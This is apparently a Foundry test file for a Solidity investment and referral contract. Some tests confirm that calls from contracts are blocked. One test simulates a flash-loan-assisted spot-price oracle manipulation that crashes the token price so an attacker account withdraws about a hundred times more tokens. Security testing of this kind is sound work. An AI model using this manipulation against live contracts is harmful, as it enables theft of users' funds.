// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "../../../Phase 3/SimulationSetup.t.sol";

contract AttackSimulationTest is SimulationSetup {
    uint256 constant WAD = 1e18;

    address attackerEOA;
    FlashLoanAttackerContract attackerContract;
    uint256 currentTimestamp;
    uint256 currentBlock;

    function setUp() public override {
        super.setUp();

        currentTimestamp = block.timestamp;
        currentBlock = block.number;

        attackerEOA = makeAddr("attackerEOA");
        // Deploy the attack contract
        attackerContract = new FlashLoanAttackerContract(address(sys), address(usdt));

        // Fund attacker EOA with some initial USDT to make a legitimate investment
        usdt.mint(attackerEOA, 1000 * WAD);

        vm.startPrank(attackerEOA, attackerEOA);
        usdt.approve(address(sys), type(uint256).max);
        sys.invest(500 * WAD, ORIGIN, 0);
        vm.stopPrank();

        // Warp 15 days so attackerEOA has ROI accrued
        warpAndRoll(15 days, 15 days / 3);
    }

    function warpAndRoll(uint256 sec, uint256 blocks) internal {
        currentTimestamp += sec;
        currentBlock += blocks;
        vm.warp(currentTimestamp);
        vm.roll(currentBlock);
    }

    // ── 1. Direct Contract Call Blocked Tests ──

    function test_flash_loan_invest_fails() public {
        // Direct investment from contract should revert due to tx.origin != msg.sender check
        usdt.mint(address(attackerContract), 10_000 * WAD);
        
        vm.prank(address(attackerContract));
        vm.expectRevert(Err_NoContractCallsAllowed.selector);
        attackerContract.executeInvest(1000 * WAD, ORIGIN);
    }

    function test_flash_loan_rank_fails() public {
        // Direct rank updates or downline building by contracts is blocked.
        // It reverts with Err_NoActiveDirects since a contract cannot have direct referrals
        // (as it cannot participate in the system).
        vm.prank(address(attackerContract));
        vm.expectRevert(Err_NoActiveDirects.selector);
        attackerContract.executeClaimRank();
    }

    function test_flash_loan_booster_fails() public {
        // Contracts cannot buy packages to act as downlines and trigger booster status
        vm.prank(address(attackerContract));
        vm.expectRevert(Err_NoContractCallsAllowed.selector);
        attackerContract.executeInvest(100 * WAD, attackerEOA);
    }

    // ── 2. End-to-End Flash Loan Assisted Oracle Exploit ──

    function test_flash_loan_eoa_oracle_exploit() public {
        // Step 1: Normal spot price is ~1.14 USDT
        uint256 normalPrice = sys.getSpotPrice();
        assertEq(normalPrice, 1140493523405716437);

        // Step 2: Attacker contract triggers a "flash loan" (represented by minting huge USDT/ptk)
        // to manipulate reserves on the Uniswap pair.
        // The attacker dumps 100,000 ptk into the pair to crash the price.
        // We simulate this by manually setting pair reserves.
        pair.setReserves(1000 * uint112(WAD), 100_000 * uint112(WAD));

        // Step 3: Verify the spot price crashed down to 0.01 USDT
        uint256 manipulatedPrice = sys.getSpotPrice();
        assertEq(manipulatedPrice, 1e16);

        // Step 4: The EOA (attackerEOA), which is allowed to call withdraw, executes the withdrawal.
        // Because of tx.origin == msg.sender, the contract allows the call.
        uint256 balanceBefore = ptk.balanceOf(attackerEOA);
        
        vm.prank(attackerEOA, attackerEOA);
        sys.withdraw();

        uint256 balanceAfter = ptk.balanceOf(attackerEOA);
        uint256 withdrawnAmount = balanceAfter - balanceBefore;

        // Since the price was distorted downward, the EOA received heavily inflated tokens
        // For 15 days, 500 USDT investment generates ~38.3 USDT.
        // At normal price (~1.14 USDT), they would receive ~33.5 tokens.
        // At crashed price (0.01 USDT), they receive ~3830 tokens!
        assertGt(withdrawnAmount, 3600 * WAD);

        // Step 5: EOA transfers the profit to the attack contract to pay back the flash loan
        vm.prank(attackerEOA, attackerEOA);
        ptk.transfer(address(attackerContract), withdrawnAmount);

        assertEq(ptk.balanceOf(address(attackerContract)), withdrawnAmount);
    }
}

contract FlashLoanAttackerContract {
    InfinitySixSystem public sys;
    IERC20 public usdt;

    constructor(address _sys, address _usdt) {
        sys = InfinitySixSystem(_sys);
        usdt = IERC20(_usdt);
    }

    function executeInvest(uint256 amount, address referrer) external {
        usdt.approve(address(sys), amount);
        sys.invest(amount, referrer, 0);
    }

    function executeClaimRank() external {
        sys.claimRank();
    }
}
